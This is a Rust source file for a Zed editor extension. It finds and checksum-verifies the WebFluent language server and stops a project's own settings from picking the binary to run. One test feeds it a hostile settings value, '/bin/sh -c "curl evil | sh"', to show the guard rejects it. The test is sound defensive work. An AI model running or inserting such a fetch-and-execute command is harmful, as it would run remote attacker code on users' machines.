//! The WebFluent extension for Zed.
//!
//! Everything static — the grammar, the language configuration, the queries,
//! the snippets — is declared in `extension.toml` and `languages/webfluent/`.
//! This crate exists for the two things a manifest cannot say: where the
//! language server is, and how its completions should be drawn.
//!
//! The server is found in this order, and the first hit wins:
//!
//! 1. `lsp.wf-lsp.binary.path` in the user's Zed settings — an absolute path
//!    outside the project. A project's own `.zed/settings.json` cannot choose
//!    the program, its arguments or its environment (see [`binary_settings`]).
//! 2. A `wf-lsp` on the `PATH` Zed was launched with (`cargo install --path
//!    crates/wf-lsp` puts it there).
//! 3. The WebFluent release this extension pins ([`SERVER_VERSION`]),
//!    downloaded into the extension's working directory and checked against
//!    the release's `SHA256SUMS` before it is made executable.
//! 4. A copy this extension downloaded and checked earlier, when the release
//!    cannot be reached.

use std::{
    fs,
    path::{Component, Path},
};

use sha2::{Digest, Sha256};
use zed_extension_api::{
    self as zed,
    lsp::{Completion, CompletionKind, Symbol, SymbolKind},
    serde_json::{self, Value},
    settings::{CommandSettings, LspSettings},
    CodeLabel, CodeLabelSpan, LanguageServerId, LanguageServerInstallationStatus, Result,
};

const SERVER_NAME: &str = "wf-lsp";
const GITHUB_REPO: &str = "monzeromer-lab/WebFluent";

/// The WebFluent release whose server this extension downloads. Raise it,
/// and release the extension, after a compiler release. Never the latest:
/// whoever could replace the latest release would otherwise choose what
/// every editor runs on its next start.
const SERVER_VERSION: &str = "v5.15.0";

struct WebFluentExtension {
    /// The binary a previous call found or downloaded. Re-checked on every
    /// call, because the user may have installed one on the `PATH` since.
    cached_binary_path: Option<String>,
}

impl WebFluentExtension {
    fn language_server_binary_path(
        &mut self,
        language_server_id: &LanguageServerId,
        worktree: &zed::Worktree,
    ) -> Result<String> {
        if let Some(path) = worktree.which(SERVER_NAME) {
            return Ok(path);
        }

        if let Some(path) = &self.cached_binary_path {
            if fs::metadata(path).is_ok_and(|stat| stat.is_file()) {
                return Ok(path.clone());
            }
        }

        zed::set_language_server_installation_status(
            language_server_id,
            &LanguageServerInstallationStatus::CheckingForUpdate,
        );

        match self.download_pinned(language_server_id) {
            Ok(path) => {
                self.cached_binary_path = Some(path.clone());
                Ok(path)
            }
            // No network, the pinned release not out yet: a copy downloaded
            // and checked by an earlier start still serves.
            Err(error) => match downloaded_server() {
                Some(path) => {
                    self.cached_binary_path = Some(path.clone());
                    Ok(path)
                }
                None => Err(install_hint(&error)),
            },
        }
    }

    /// The pinned release's server, downloaded as the bare executable and
    /// held to the release's `SHA256SUMS` before it is moved into place. A
    /// download that does not match is deleted, never run.
    fn download_pinned(&mut self, language_server_id: &LanguageServerId) -> Result<String> {
        let (os, arch) = zed::current_platform();
        let exe = if os == zed::Os::Windows { ".exe" } else { "" };
        let version_dir = format!("{SERVER_NAME}-{SERVER_VERSION}");
        let binary_path = format!("{version_dir}/{SERVER_NAME}{exe}");
        if fs::metadata(&binary_path).is_ok_and(|stat| stat.is_file()) {
            return Ok(binary_path);
        }

        let release = zed::github_release_by_tag_name(GITHUB_REPO, SERVER_VERSION)
            .map_err(|error| format!("could not look up release {SERVER_VERSION}: {error}"))?;

        let asset_name = format!(
            "{SERVER_NAME}-{SERVER_VERSION}-{arch}-{os}{exe}",
            arch = match arch {
                zed::Architecture::Aarch64 => "aarch64",
                zed::Architecture::X86 => "x86",
                zed::Architecture::X8664 => "x86_64",
            },
            os = match os {
                zed::Os::Mac => "macos",
                zed::Os::Linux => "linux",
                zed::Os::Windows => "windows",
            },
        );
        let find = |name: &str| {
            release
                .assets
                .iter()
                .find(|asset| asset.name == name)
                .ok_or_else(|| format!("release {SERVER_VERSION} has no asset named {name}"))
        };
        let asset = find(&asset_name)?;
        let sums_asset = find("SHA256SUMS")?;

        zed::set_language_server_installation_status(
            language_server_id,
            &LanguageServerInstallationStatus::Downloading,
        );

        let partial = format!("{version_dir}.partial");
        fs::remove_dir_all(&partial).ok();
        fs::create_dir_all(&partial).map_err(|e| format!("could not create {partial}: {e}"))?;
        let sums_path = format!("{partial}/SHA256SUMS");
        let download_path = format!("{partial}/{SERVER_NAME}{exe}");

        let checked = (|| -> Result<()> {
            zed::download_file(
                &sums_asset.download_url,
                &sums_path,
                zed::DownloadedFileType::Uncompressed,
            )
            .map_err(|e| format!("failed to download SHA256SUMS: {e}"))?;
            zed::download_file(
                &asset.download_url,
                &download_path,
                zed::DownloadedFileType::Uncompressed,
            )
            .map_err(|e| format!("failed to download {asset_name}: {e}"))?;
            let sums = fs::read_to_string(&sums_path)
                .map_err(|e| format!("could not read SHA256SUMS: {e}"))?;
            let data = fs::read(&download_path)
                .map_err(|e| format!("could not read {asset_name}: {e}"))?;
            verify(&data, &asset_name, &sums)
        })();
        if let Err(error) = checked {
            fs::remove_dir_all(&partial).ok();
            return Err(error);
        }
        fs::remove_file(&sums_path).ok();

        fs::remove_dir_all(&version_dir).ok();
        fs::rename(&partial, &version_dir)
            .map_err(|e| format!("could not move {partial} into place: {e}"))?;
        zed::make_file_executable(&binary_path)?;

        // Older downloads are of no further use; keep the directory tidy.
        if let Ok(entries) = fs::read_dir(".") {
            for entry in entries.flatten() {
                if entry.file_name().to_str() != Some(&version_dir) {
                    fs::remove_dir_all(entry.path()).ok();
                }
            }
        }
        Ok(binary_path)
    }
}

/// `data`'s SHA-256 against the line for `name` in a `SHA256SUMS` file.
fn verify(data: &[u8], name: &str, sums: &str) -> Result<()> {
    let want = sums
        .lines()
        .filter_map(|line| {
            let (hash, file) = line.trim().split_once(char::is_whitespace)?;
            let file = file.trim_start();
            let file = file.strip_prefix('*').unwrap_or(file);
            (file == name).then_some(hash)
        })
        .next()
        .ok_or_else(|| {
            format!("SHA256SUMS lists no {name}; refusing a download that cannot be checked")
        })?;
    if want.len() != 64 || !want.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err(format!("SHA256SUMS has a malformed entry for {name}"));
    }
    let have: String = Sha256::digest(data)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    if !have.eq_ignore_ascii_case(want) {
        return Err(format!(
            "{name} does not match the release's SHA256SUMS (expected {want}, got {have}); not installed"
        ));
    }
    Ok(())
}

/// The newest server this extension downloaded and checked before, if any:
/// the `wf-lsp-<version>/wf-lsp` with the highest version in the working
/// directory. A `.partial` directory — a download not yet checked — never
/// counts.
fn downloaded_server() -> Option<String> {
    let (os, _) = zed::current_platform();
    let exe = if os == zed::Os::Windows { ".exe" } else { "" };
    let mut versions: Vec<(Vec<u32>, String)> = fs::read_dir(".")
        .ok()?
        .flatten()
        .filter_map(|entry| {
            let name = entry.file_name().to_str()?.to_string();
            let version = name.strip_prefix(&format!("{SERVER_NAME}-"))?;
            let parts: Vec<u32> = version
                .strip_prefix('v')
                .unwrap_or(version)
                .split('.')
                .map(|p| p.parse().ok())
                .collect::<Option<_>>()?;
            let path = format!("{name}/{SERVER_NAME}{exe}");
            fs::metadata(&path).ok()?.is_file().then_some(())?;
            Some((parts, path))
        })
        .collect();
    versions.sort();
    versions.pop().map(|(_, path)| path)
}

/// An error that also says how to get past it, since the fix is one command.
fn install_hint(reason: &str) -> String {
    format!(
        "{SERVER_NAME} is not installed and could not be downloaded ({reason}).\n\
         Install it with `cargo install --git https://github.com/{GITHUB_REPO} wf-lsp`, \
         or point Zed at a binary in your user settings.json:\n\
         {{ \"lsp\": {{ \"{SERVER_NAME}\": {{ \"binary\": {{ \"path\": \"/path/to/{SERVER_NAME}\" }} }} }} }}"
    )
}

/// `lsp.wf-lsp.binary` as the user set it, or `None`.
///
/// Zed's extension API (0.7) hands an extension the settings merged for the
/// worktree, with no way to ask which file a value came from, so a project
/// could set `binary.path` to `/bin/sh` and `arguments` to `["-c", "…"]` in
/// its own `.zed/settings.json`. Two rules keep that from running:
///
/// - When the project's `.zed/settings.json` says anything about
///   `lsp.wf-lsp.binary` (or cannot be read as JSON and names `wf-lsp`), the
///   binary settings are ignored entirely — path, arguments and environment.
///   Set them in your user settings instead; a project may still forward
///   server options under `lsp.wf-lsp.settings`.
/// - A `binary.path` must be absolute and outside the project; otherwise the
///   binary settings are ignored too.
fn binary_settings(
    settings: Option<CommandSettings>,
    project_settings: Option<&str>,
    root: &str,
) -> Option<CommandSettings> {
    let settings = settings?;
    if project_settings.is_some_and(project_sets_binary) {
        return None;
    }
    if let Some(path) = &settings.path {
        if !absolute_outside(path, root) {
            return None;
        }
    }
    Some(settings)
}

/// Whether a project's `.zed/settings.json` sets `lsp.wf-lsp.binary`. Zed
/// reads the file as JSON with comments and trailing commas; a file this
/// cannot read but that names `wf-lsp` counts as setting it.
fn project_sets_binary(text: &str) -> bool {
    match serde_json::from_str::<Value>(&strip_jsonc(text)) {
        Ok(json) => json
            .get("lsp")
            .and_then(|lsp| lsp.get(SERVER_NAME))
            .and_then(|server| server.get("binary"))
            .is_some_and(|binary| !binary.is_null()),
        Err(_) => text.contains(SERVER_NAME),
    }
}

/// JSON with comments and trailing commas as plain JSON: comments outside
/// strings dropped, a comma before `}` or `]` dropped.
fn strip_jsonc(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    let mut in_string = false;
    while let Some(c) = chars.next() {
        if in_string {
            out.push(c);
            if c == '\\' {
                if let Some(next) = chars.next() {
                    out.push(next);
                }
            } else if c == '"' {
                in_string = false;
            }
            continue;
        }
        match c {
            '"' => {
                in_string = true;
                out.push(c);
            }
            '/' if chars.peek() == Some(&'/') => {
                for next in chars.by_ref() {
                    if next == '\n' {
                        out.push('\n');
                        break;
                    }
                }
            }
            '/' if chars.peek() == Some(&'*') => {
                chars.next();
                let mut last = ' ';
                for next in chars.by_ref() {
                    if last == '*' && next == '/' {
                        break;
                    }
                    last = next;
                }
                out.push(' ');
            }
            _ => out.push(c),
        }
    }
    // Trailing commas: a `,` followed only by white space and `}` or `]`.
    let bytes: Vec<char> = out.chars().collect();
    let mut cleaned = String::with_capacity(bytes.len());
    let mut in_string = false;
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i];
        if in_string {
            cleaned.push(c);
            if c == '\\' && i + 1 < bytes.len() {
                cleaned.push(bytes[i + 1]);
                i += 1;
            } else if c == '"' {
                in_string = false;
            }
        } else if c == '"' {
            in_string = true;
            cleaned.push(c);
        } else if c == ',' {
            let next = bytes[i + 1..].iter().find(|c| !c.is_whitespace());
            if !matches!(next, Some('}') | Some(']')) {
                cleaned.push(c);
            }
        } else {
            cleaned.push(c);
        }
        i += 1;
    }
    cleaned
}

/// Whether `path` is absolute, free of `..`, and not inside `root`.
fn absolute_outside(path: &str, root: &str) -> bool {
    let p = Path::new(path);
    // A Windows path is absolute with a drive (`C:\…`) or as a UNC path.
    let windows_absolute = {
        let b = path.as_bytes();
        (b.len() > 2
            && b[0].is_ascii_alphabetic()
            && b[1] == b':'
            && (b[2] == b'\\' || b[2] == b'/'))
            || path.starts_with("\\\\")
    };
    if !(p.is_absolute() || path.starts_with('/') || windows_absolute) {
        return false;
    }
    if path.split(['/', '\\']).any(|part| part == "..")
        || p.components().any(|c| c == Component::ParentDir)
    {
        return false;
    }
    let norm = |s: &str| {
        let s = s.replace('\\', "/");
        let s = s.trim_end_matches('/').to_string();
        if windows_absolute {
            s.to_ascii_lowercase()
        } else {
            s
        }
    };
    let (path, root) = (norm(path), norm(root));
    if root.is_empty() {
        return true;
    }
    !(path == root || path.starts_with(&format!("{root}/")))
}

impl zed::Extension for WebFluentExtension {
    fn new() -> Self {
        Self {
            cached_binary_path: None,
        }
    }

    fn language_server_command(
        &mut self,
        language_server_id: &LanguageServerId,
        worktree: &zed::Worktree,
    ) -> Result<zed::Command> {
        let merged = LspSettings::for_worktree(language_server_id.as_ref(), worktree)
            .ok()
            .and_then(|settings| settings.binary);
        let project = worktree.read_text_file(".zed/settings.json").ok();
        let settings = binary_settings(merged, project.as_deref(), &worktree.root_path());

        let command = match settings.as_ref().and_then(|binary| binary.path.clone()) {
            Some(path) => path,
            None => self.language_server_binary_path(language_server_id, worktree)?,
        };

        let args = settings
            .as_ref()
            .and_then(|binary| binary.arguments.clone())
            .unwrap_or_default();

        // The server inherits the shell's environment (so a `PATH`, a proxy or
        // a locale set there reach it), with anything from settings on top.
        let mut env = worktree.shell_env();
        if let Some(extra) = settings.and_then(|binary| binary.env) {
            env.extend(extra);
        }

        Ok(zed::Command { command, args, env })
    }

    fn language_server_workspace_configuration(
        &mut self,
        language_server_id: &LanguageServerId,
        worktree: &zed::Worktree,
    ) -> Result<Option<zed::serde_json::Value>> {
        // Forwarded as-is from `lsp.wf-lsp.settings` in settings.json, so a
        // future server option needs no change here.
        Ok(
            LspSettings::for_worktree(language_server_id.as_ref(), worktree)
                .ok()
                .and_then(|settings| settings.settings),
        )
    }

    /// Draws a completion the way the same text would look in a buffer: a
    /// component in the component colour, a state variable after `state`,
    /// an action as a call. The `code` is parsed with the WebFluent grammar
    /// and highlighted by the theme, so the menu matches the editor.
    fn label_for_completion(
        &self,
        _language_server_id: &LanguageServerId,
        completion: Completion,
    ) -> Option<CodeLabel> {
        let name = completion.label.clone();
        let detail = completion.detail.as_deref().unwrap_or("");
        let kind = completion.kind?;

        let (code, name_range) = match kind {
            // Built-in and user components: `Card`, `UserCard`.
            CompletionKind::Class => (name.clone(), 0..name.len()),

            // `state count`, `derived total`, a prop, a store member.
            CompletionKind::Variable => {
                let prefix = if detail.contains("derived") {
                    "derived "
                } else if detail.contains("Prop") {
                    "prop "
                } else {
                    "state "
                };
                let code = format!("{prefix}{name}");
                (code, prefix.len()..prefix.len() + name.len())
            }

            // Actions and functions read as a call.
            CompletionKind::Function | CompletionKind::Method => {
                (format!("{name}()"), 0..name.len())
            }

            // Named arguments, style properties and map keys carry their colon.
            CompletionKind::Property | CompletionKind::Field => (format!("{name}:"), 0..name.len()),

            // Modifiers such as `primary` or `bold` are attributes in the
            // highlight query, and are drawn that way here too.
            CompletionKind::EnumMember | CompletionKind::Constant => {
                return Some(literal_label(&name, "attribute", detail));
            }

            CompletionKind::Keyword => return Some(literal_label(&name, "keyword", detail)),

            _ => return None,
        };

        let mut spans = vec![CodeLabelSpan::code_range(name_range)];
        spans.push(detail_span(detail));

        Some(CodeLabel {
            code,
            spans,
            filter_range: (0..name.len()).into(),
        })
    }

    fn label_for_symbol(
        &self,
        _language_server_id: &LanguageServerId,
        symbol: Symbol,
    ) -> Option<CodeLabel> {
        let highlight = match symbol.kind {
            SymbolKind::Class | SymbolKind::Module | SymbolKind::Namespace => "type",
            SymbolKind::Function | SymbolKind::Method => "function",
            SymbolKind::Variable | SymbolKind::Field | SymbolKind::Property => "variable",
            SymbolKind::Constant => "constant",
            _ => return None,
        };
        Some(CodeLabel {
            spans: vec![CodeLabelSpan::literal(
                symbol.name.clone(),
                Some(highlight.to_string()),
            )],
            filter_range: (0..symbol.name.len()).into(),
            code: String::new(),
        })
    }
}

/// A label drawn with one theme colour rather than parsed as code.
fn literal_label(name: &str, highlight: &str, detail: &str) -> CodeLabel {
    CodeLabel {
        spans: vec![
            CodeLabelSpan::literal(name.to_string(), Some(highlight.to_string())),
            detail_span(detail),
        ],
        filter_range: (0..name.len()).into(),
        code: String::new(),
    }
}

/// The server's one-line description, dimmed after the name.
fn detail_span(detail: &str) -> CodeLabelSpan {
    if detail.is_empty() {
        CodeLabelSpan::literal(String::new(), None)
    } else {
        CodeLabelSpan::literal(format!("  {detail}"), Some("comment".to_string()))
    }
}

zed::register_extension!(WebFluentExtension);

#[cfg(test)]
mod tests {
    use super::*;

    fn binary(path: Option<&str>, args: &[&str]) -> CommandSettings {
        CommandSettings {
            path: path.map(str::to_string),
            arguments: Some(args.iter().map(|a| a.to_string()).collect()),
            env: None,
        }
    }

    #[test]
    fn a_download_is_held_to_its_line_in_sha256sums() {
        let data = b"wf-lsp";
        let hash: String = Sha256::digest(data)
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect();
        let sums = format!(
            "{}  other.zip\n{hash}  wf-lsp-v1.0.0-x86_64-linux\n",
            "0".repeat(64)
        );
        assert!(verify(data, "wf-lsp-v1.0.0-x86_64-linux", &sums).is_ok());
        assert!(verify(
            data,
            "wf-lsp-v1.0.0-x86_64-linux",
            &sums
                .to_uppercase()
                .replace("WF-LSP-V1.0.0-X86_64-LINUX", "wf-lsp-v1.0.0-x86_64-linux")
        )
        .is_ok());
        let tampered = verify(b"evil", "wf-lsp-v1.0.0-x86_64-linux", &sums).unwrap_err();
        assert!(tampered.contains("does not match"), "{tampered}");
        let missing = verify(data, "wf-lsp-v1.0.0-x86_64-macos", &sums).unwrap_err();
        assert!(missing.contains("lists no"), "{missing}");
        let short = verify(data, "x", "abc  x\n").unwrap_err();
        assert!(short.contains("malformed"), "{short}");
        assert!(verify(data, "x", &format!("{hash} *x\n")).is_ok());
    }

    #[test]
    fn a_project_cannot_set_the_binary() {
        let root = "/home/me/project";
        let shell = || Some(binary(Some("/bin/sh"), &["-c", "curl evil | sh"]));
        let project = r#"{
            // the project's own settings
            "lsp": { "wf-lsp": { "binary": { "path": "/bin/sh", "arguments": ["-c", "x"], }, }, },
        }"#;
        assert!(binary_settings(shell(), Some(project), root).is_none());
        // A project file this cannot read, but that names the server.
        assert!(binary_settings(shell(), Some("{ \"lsp\": { \"wf-lsp\": "), root).is_none());
        // Arguments alone from a project are ignored too.
        let args_only = r#"{ "lsp": { "wf-lsp": { "binary": { "arguments": ["--evil"] } } } }"#;
        assert!(binary_settings(Some(binary(None, &["--evil"])), Some(args_only), root).is_none());
    }

    #[test]
    fn the_users_binary_is_used_when_the_project_says_nothing_about_it() {
        let root = "/home/me/project";
        let user = || Some(binary(Some("/home/me/.cargo/bin/wf-lsp"), &["--log"]));
        assert!(binary_settings(user(), None, root).is_some());
        let server_options_only =
            r#"{ "lsp": { "wf-lsp": { "settings": { "x": 1 } } }, "tab_size": 4 }"#;
        assert!(binary_settings(user(), Some(server_options_only), root).is_some());
        assert!(binary_settings(user(), Some("{ \"tab_size\": 2, // wf\n }"), root).is_some());
        assert!(binary_settings(None, None, root).is_none());
    }

    #[test]
    fn the_binary_must_be_absolute_and_outside_the_project() {
        let root = "/home/me/project";
        for inside in [
            "wf-lsp",
            "./wf-lsp",
            "target/release/wf-lsp",
            "/home/me/project/target/release/wf-lsp",
            "/home/me/project",
            "/usr/bin/../../home/me/project/x",
        ] {
            assert!(!absolute_outside(inside, root), "{inside}");
            assert!(binary_settings(Some(binary(Some(inside), &[])), None, root).is_none());
        }
        assert!(absolute_outside("/home/me/project-other/wf-lsp", root));
        assert!(absolute_outside("/usr/local/bin/wf-lsp", root));
        assert!(!absolute_outside(
            "C:\\Users\\me\\proj\\wf-lsp.exe",
            "C:\\Users\\me\\proj"
        ));
        assert!(!absolute_outside(
            "c:/users/me/PROJ/wf-lsp.exe",
            "C:\\Users\\me\\proj"
        ));
        assert!(absolute_outside(
            "C:\\Tools\\wf-lsp.exe",
            "C:\\Users\\me\\proj"
        ));
    }

    #[test]
    fn jsonc_is_read_as_zed_reads_it() {
        let text = "{\n  // a comment\n  \"a\": \"http://x/*y*/\", /* block */ \"b\": [1, 2,],\n}";
        let json: Value = serde_json::from_str(&strip_jsonc(text)).unwrap();
        assert_eq!(json["a"], "http://x/*y*/");
        assert_eq!(json["b"][1], 2);
    }
}
